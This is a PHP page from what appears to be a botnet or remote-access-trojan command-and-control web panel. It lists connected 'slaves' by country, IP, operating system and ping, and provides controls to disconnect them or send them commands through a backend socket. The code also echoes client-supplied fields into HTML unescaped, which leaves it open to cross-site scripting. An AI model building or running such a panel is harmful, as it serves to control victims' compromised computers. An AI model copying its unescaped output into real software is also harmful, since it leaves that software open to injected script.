<?php
xdebug_disable();

require_once "request.php";

$request = new Request();
$sock = $request->createSocket();

if (isset($_POST['select'])) {
	if (isset($_POST['disconnect'])) {
		$request->write($sock, 10);
		$request->write($sock, count($_POST ['select']));
		foreach ($_POST['select'] as $slave) {
			$request->write($sock, $slave);
		}
	}

	if (isset($_POST['command'])) {
		$s;
		foreach ($_POST['select'] as $slave) {
			$s .= $slave . ",";
		}
		header("Location: commands.php?clients=" . $s);
		exit();
	}
	
} else {

}

$slaves = $request->getSlaves($sock);
$request->disconnect($sock);

require "layout/header.php";

?>

<script type="text/javascript">
    setInterval("reload_table();", 1000); 
    function reload_table(){
      $('#refresh').load(location.href + ' #table');
    }
</script>

<script>
$(document).ready(function() {
    $('#selectall').click(function(event) {
        if(this.checked) { 
            $('.box').each(function() {
                this.checked = true;          
            });
        }else{
            $('.box').each(function() { 
                this.checked = false;            
            });         
        }
    });
    
});
</script>


<section class="wrapper scrollable">
	<?php require "layout/menubar.php"; ?>
	<br>
	<div class="col-md-12">
		<div class="panel panel-default panel-block">
			<div class="list-group">
				<div id="refresh" class="list-group-item">
					<div id="table" class="form-group">
						<form method="POST">

							<h4 class="section-title">Client List (<?php echo count($slaves); ?>)</h4>
							<div class="form-group" align=right>
								<button type="submit" name="disconnect" class="btn btn-default">
									<i class="fa fa-times"></i> Disconnect
								</button>
								<button type="submit" name="command" class="btn btn-default">
									<i class="fa fa-external-link"></i> Command
								</button>

							</div>

							<table class="table table-bordered table-striped">
								<thead class="">
									<tr>
										<th>Country</th>
										<th>Identifier</th>
										<th>IP</th>
										<th>Operating System</th>
										<th>Version</th>
										<th>Ping</th>
										<th></th>
										<th><input type="checkbox" class="box" id="selectall"></th>
									</tr>
								</thead>
								<tbody>
	
					<?php
					
					function printTableData($s) {
						echo "<td>" . $s . "</td>\n";
					}
					
					$page = isset($_GET['page']) ? $_GET['page'] : "all";
					
					if ($page == 0) {
						$page = "all";
					}
					
					$displayed = 0;
					
					if ($page == "all") {
						$start = 0;
						$max = count($slaves);
					} else {
						$page--;
						
						$max = 10;
						$start = $page * $max;
						
						if ($page < 0) {
							$page = 0;
						}
					}
					
					for($i = $start; $i < $start + $max; $i ++) {
						if (!isset($slaves[$i])) {
							break;
						}
						$slave = $slaves [$i];
						
						$displayed ++;
						
						echo "<tr>\n";
						echo printTableData($slave->getDisplayCountry());
						echo printTableData($slave->getIdentifier());
						echo printTableData($slave->getIP());
						echo printTableData($slave->getOperatingSystem());
						echo printTableData($slave->getVersion());
						echo printTableData($slave->getPing());
						echo printTableData("<a href='client.php?id=" . $slave->getUniqueId() . "'>Control Panel</a>");
						echo printTableData("<input class='box' type='checkbox' name='select[$i]' value='" . $slave->getUniqueId() . "'>");
						echo "</tr>\n";
					
					}
					?>
	
					</tbody>
							</table>
						</form>
						<div class="form-group" align="right">
							<div>

								<ul class="pagination pagination-demo">
						
									<?php
									if ($page != "all") {
										$page ++;
									}
									echo '<li><a href="clients.php?page=' . ($page - 1) . '">&laquo;</a></li>';
									echo '<li><a href="clients.php?page=' . ($page) . '">' . ($page) . '</a></li>';
									echo '<li><a href="clients.php?page=' . ($page + 1) . '">&raquo;</a></li>';
									?>
									
								</ul>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</section>

<?php 

require "layout/footer.php";

?>